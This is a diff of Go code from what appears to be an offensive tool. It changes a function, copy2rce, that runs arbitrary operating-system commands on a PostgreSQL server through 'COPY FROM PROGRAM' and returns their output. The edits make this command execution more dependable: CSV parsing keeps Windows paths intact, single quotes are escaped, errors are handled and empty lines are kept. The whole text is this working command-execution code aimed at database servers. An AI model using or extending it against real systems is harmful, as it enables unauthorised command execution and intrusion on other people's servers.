@@ -139,7 +139,17 @@ func copy2rce(conn *pgx.Conn, cmd string) string {
 	conn.Exec(ctx, fmt.Sprintf("CREATE TABLE cmd_exec%s(cmd_output text);", salt))
 	defer conn.Exec(ctx, fmt.Sprintf("DROP TABLE IF EXISTS cmd_exec%s;", salt))
 
-	conn.Exec(ctx, fmt.Sprintf("COPY cmd_exec%s FROM PROGRAM '%s';", salt, cmd))
+	// Text COPY format eats backslashes as escape sequences (C:\Program Files
+	// becomes C:Program Files), so read program output in CSV format with
+	// control bytes as delimiter/quote to keep the output byte-exact.
+	copyQuery := fmt.Sprintf(
+		"COPY cmd_exec%s FROM PROGRAM '%s' WITH (FORMAT csv, DELIMITER E'\\x1f', QUOTE E'\\x02');",
+		salt, strings.ReplaceAll(cmd, "'", "''"),
+	)
+	_, err := conn.Exec(ctx, copyQuery)
+	if err != nil {
+		return fmt.Sprintf("Command execution failed: %v\n", err)
+	}
 	rows, err := conn.Query(ctx, fmt.Sprintf("SELECT * FROM cmd_exec%s;", salt))
 	if err != nil {
 		fmt.Println("Query failed: ", err)
@@ -147,11 +157,16 @@ func copy2rce(conn *pgx.Conn, cmd string) string {
 
 	var output strings.Builder
 	for rows.Next() {
-		var line string
+		// Empty lines come back as NULL in CSV format, so scan into a
+		// nullable string to keep them instead of failing the whole read.
+		var line *string
 		if err := rows.Scan(&line); err != nil {
-			return ""
+			break
 		}
-		output.WriteString(line + "\n")
+		if line != nil {
+			output.WriteString(*line)
+		}
+		output.WriteString("\n")
 	}
 
 	return output.String()
